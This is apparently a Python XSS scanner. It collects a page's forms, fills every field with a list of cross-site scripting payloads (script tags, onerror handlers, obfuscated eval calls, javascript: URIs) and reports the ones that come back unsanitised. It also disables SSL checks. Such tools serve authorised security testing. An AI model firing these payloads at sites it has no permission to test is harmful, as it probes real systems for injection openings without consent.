import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import textwrap
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings (only for development/testing!)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Display configuration
LINE_LENGTH = 80
SECTION_CHAR = "="
SUBSECTION_CHAR = "-"

# Optimized XSS payload list
payloads = [
    # Basic payloads
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    
    # Obfuscated payloads
    "<script>eval('al'+'ert(1)')</script>",
    "<a href=\"javas&#99;ript:alert(1)\">XSS</a>",
    
    # Advanced payloads
    "<script>Function('ale'+'rt(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    
    # Encoded payloads
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "javascript:alert(1)",
    
    # HTML event payloads
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror='alert(1)'>",
    
    # Template payloads
    "${alert(1)}",
    "#{alert(1)}",
]

def print_header(title):
    print(f"\n{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{CYAN}{title.center(LINE_LENGTH)}{RESET}")
    print(f"{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")

def print_subheader(title, color=CYAN):
    print(f"\n{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{color}{title.center(LINE_LENGTH)}{RESET}")
    print(f"{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")

def print_info(message, prefix=""):
    lines = textwrap.wrap(message, width=LINE_LENGTH - len(prefix))
    for line in lines:
        print(f"{WHITE}{prefix}{line}{RESET}")

def print_success(message):
    print(f"{GREEN}[+] {message}{RESET}")

def print_warning(message):
    print(f"{YELLOW}[!] {message}{RESET}")

def print_error(message):
    print(f"{RED}[-] {message}{RESET}")

def print_vulnerability(message):
    print(f"{RED}{message}{RESET}")

def encontrar_formularios(url):
    print_header("SCANNING FOR FORMS")
    print_info(f"Analyzing URL: {url}")
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)',
            'Accept': 'text/html,application/xhtml+xml'
        }
        res = requests.get(url, headers=headers, timeout=10, verify=False)
        res.raise_for_status()
        
        soup = BeautifulSoup(res.content, "html.parser")
        forms = soup.find_all("form")
        
        if forms:
            print_success(f"Found {len(forms)} form(s)")
        else:
            print_warning("No forms found")
        return forms
        
    except requests.RequestException as e:
        print_error(f"Error accessing URL: {e}")
        return []

def obter_dados_formulario(form):
    data = {}
    action = form.get("action")
    method = form.get("method", "get").lower()
    
    inputs = form.find_all(["input", "textarea", "select"])
    for input_tag in inputs:
        name = input_tag.get("name")
        if name:
            value = input_tag.get("value", "")
            data[name] = value
            
    return action, method, data

def verificar_reflexao_contexto(response, payload):
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Check in script tags
    scripts = soup.find_all('script', string=lambda t: payload in str(t))
    if scripts:
        return True
    
    # Check event handlers
    event_handlers = [
        'onload', 'onerror', 'onclick', 
        'onmouseover', 'onfocus', 'onsubmit'
    ]
    
    for tag in soup.find_all():
        for attr in tag.attrs:
            if attr.lower() in event_handlers:
                if payload in str(tag[attr]):
                    return True
            if payload in str(tag.get(attr, '')):
                if any(c in str(tag.get(attr, '')) for c in ['<', '>', '"', "'"]):
                    return True
    
    # Check in href/javascript
    links = soup.find_all('a', href=lambda x: x and 'javascript:' in x and payload in x)
    if links:
        return True
    
    # Check for unencoded dangerous characters
    if any(c in response.text for c in ['<', '>', '"', "'"]) and payload in response.text:
        return True
        
    return False

def verificar_sanitizacao(response, payload):
    dangerous_chars = ['<', '>', '"', "'", '&', '/']
    sanitized_chars = ['&lt;', '&gt;', '&quot;', '&#39;', '&amp;', '&#x2F;']
    
    for i, char in enumerate(dangerous_chars):
        if char in payload:
            if char in response.text:
                if sanitized_chars[i] not in response.text:
                    return False
            else:
                return True
                
    return True

def test_payload(url_destino, method, data, payload_name, payload):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)',
            'X-Scanner': 'XSS-Detector/1.0'
        }
        
        test_data = {k: payload for k in data}
        
        if method == "post":
            res = requests.post(url_destino, data=test_data, 
                              headers=headers, timeout=15, verify=False)
        else:
            res = requests.get(url_destino, params=test_data,
                             headers=headers, timeout=15, verify=False)
        
        result = {
            'payload': payload,
            'payload_name': payload_name,
            'url': res.url,
            'status': res.status_code,
            'method': method.upper(),
            'reflected': payload in res.text,
            'context': False,
            'sanitized': False
        }
        
        if result['reflected']:
            result['sanitized'] = verificar_sanitizacao(res, payload)
            if not result['sanitized']:
                result['context'] = verificar_reflexao_contexto(res, payload)
        
        return result
        
    except requests.RequestException as e:
        print_error(f"Request error for {payload_name}: {e}")
        return None

def testar_xss(url):
    forms = encontrar_formularios(url)
    if not forms:
        return []

    all_vulnerabilities = []
    
    for i, form in enumerate(forms, start=1):
        print_header(f"TESTING FORM {i}/{len(forms)}")
        action, method, data = obter_dados_formulario(form)
        url_destino = urljoin(url, action)

        print_info(f"Form URL: {url_destino}")
        print_info(f"Method: {method.upper()}")
        print_info(f"Fields: {', '.join(data.keys()) if data else 'None'}")
        
        print_subheader("STARTING XSS TESTS", MAGENTA)
        print_info(f"Total payloads to test: {len(payloads)}")

        vulnerabilities = []
        
        # Using ThreadPoolExecutor for faster scanning
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {
                executor.submit(
                    test_payload, 
                    url_destino, 
                    method, 
                    data, 
                    f"Payload {j+1}", 
                    payload
                ): (j, payload) 
                for j, payload in enumerate(payloads)
            }
            
            for future in as_completed(futures):
                j, payload = futures[future]
                try:
                    result = future.result()
                    if result:
                        print(f"\n{BLUE}[Test {j+1}/{len(payloads)}]{RESET}")
                        print(f"{YELLOW}Payload:{RESET} {payload}")
                        
                        if result['reflected']:
                            if result['sanitized']:
                                print(f"{GREEN}Payload detected but sanitized{RESET}")
                            elif result['context']:
                                msg = "Confirmed XSS vulnerability!"
                                print_vulnerability(msg)
                                vulnerabilities.append(result)
                            else:
                                print(f"{YELLOW}Payload reflected but no execution context{RESET}")
                        else:
                            print(f"{GREEN}No reflection detected{RESET}")
                            
                except Exception as e:
                    print_error(f"Error processing payload {j+1}: {e}")
        
        if vulnerabilities:
            print_header("VULNERABILITY REPORT")
            for vuln in vulnerabilities:
                print(f"\n{RED}=== XSS Vulnerability ==={RESET}")
                print(f"{WHITE}Payload: {RED}{vuln['payload']}{RESET}")
                print(f"{WHITE}Method: {vuln['method']}")
                print(f"{WHITE}URL: {vuln['url']}")
                print(f"{WHITE}Status: {vuln['status']}")
                
            all_vulnerabilities.extend(vulnerabilities)
    
    return all_vulnerabilities

if __name__ == "__main__":
    print_header("ADVANCED XSS SCANNER")
    url = input(f"{CYAN}Enter URL to scan for XSS:{RESET} ").strip()
    
    if not url.startswith(('http://', 'https://')):
        url = f"https://{url}"
    
    vulnerabilities = testar_xss(url)
    
    if vulnerabilities:
        print_header("SCAN SUMMARY")
        print(f"\n{RED}Found {len(vulnerabilities)} potential XSS vulnerabilities{RESET}")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n{WHITE}{i}. {vuln['payload']}")
            print(f"   URL: {vuln['url']}")
    else:
        print_success("\nNo XSS vulnerabilities found")
    
    print_header("SCAN COMPLETED")